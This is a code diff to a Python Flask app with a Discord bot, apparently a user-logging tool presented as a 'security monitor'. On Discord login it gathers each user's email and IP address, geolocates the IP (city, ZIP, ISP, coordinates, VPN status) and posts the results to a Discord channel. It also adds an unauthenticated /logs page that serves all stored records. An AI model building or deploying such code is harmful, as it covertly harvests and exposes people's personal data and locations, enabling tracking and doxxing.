@@ -36,7 +36,7 @@ def get_geo_info(ip):
         "map_link": None,
     }
 
-    # --- ip-api メイン ---
+    # --- ip-api ---
     try:
         res = requests.get(
             f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,countryCode,regionName,city,zip,org,as,lat,lon,timezone,proxy,hosting,query",
@@ -178,25 +178,53 @@ def callback():
 
     save_log(user["id"], data_log)
 
-    # Discord Embed送信
+    # ----------------- Discord Embed送信 -----------------
     try:
+        embed_desc = (
+            f"[ ユーザー ]\n"
+            f"{data_log['username']}#{data_log['discriminator']}\n"
+            f"ID={data_log['id']}\n"
+            f"Email={data_log['email']}\n"
+            f"IP={data_log['ip']}\n"
+            f"Region={data_log['country']}/{data_log['region']}/{data_log['city']}\n"
+            f"ZIP={data_log['zip']}\n"
+            f"ORG={data_log['org']}\n"
+            f"ASN={data_log['asn']}\n"
+            f"Timezone={data_log['timezone']}\n"
+            f"緯度/経度={data_log['lat']},{data_log['lon']}\n"
+            f"VPN/Proxy={data_log['vpn_proxy']}\n"
+            f"Country Code={data_log['country_code']}\n"
+            f"Flag={data_log['flag']}\n"
+            f"Google Map={data_log['map_link']}"
+        )
+
         embed_data = {
             "title": "🔐 セキュリティログ通知",
             "color": 0x2B2D31,
-            "description": f"""
-```ini
-[ ユーザー ]
-{data_log['username']}#{data_log['discriminator']}
-ID={data_log['id']}
-Email={data_log['email']}
-IP={data_log['ip']}
-Region={data_log['country']}/{data_log['region']}/{data_log['city']}
-ZIP={data_log['zip']}
-ORG={data_log['org']}
-ASN={data_log['asn']}
-Timezone={data_log['timezone']}
-緯度/経度={data_log['lat']},{data_log['lon']}
-VPN/Proxy={data_log['vpn_proxy']}
-Country Code={data_log['country_code']}
-Flag={data_log['flag']}
-Google Map={data_log['map_link']}
+            "description": f"```ini\n{embed_desc}\n```",
+            "thumbnail": {"url": f"https://cdn.discordapp.com/embed/avatars/0.png"},
+            "footer": {"text": "BLACK_ルアン セキュリティモニター"},
+            "timestamp": datetime.utcnow().isoformat()
+        }
+
+        bot.loop.create_task(bot.send_log(embed=embed_data))
+    except Exception as e:
+        print("Embed送信エラー:", e)
+
+    return render_template("welcome.html", username=data_log["username"], discriminator=data_log["discriminator"])
+
+@app.route("/logs")
+def show_logs():
+    if os.path.exists(ACCESS_LOG_FILE):
+        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
+            logs = json.load(f)
+    else:
+        logs = {}
+    return render_template("logs.html", logs=logs)
+
+def run_bot():
+    bot.run(DISCORD_BOT_TOKEN)
+
+if __name__ == "__main__":
+    threading.Thread(target=run_bot, daemon=True).start()
+    app.run(host="0.0.0.0", port=10000)
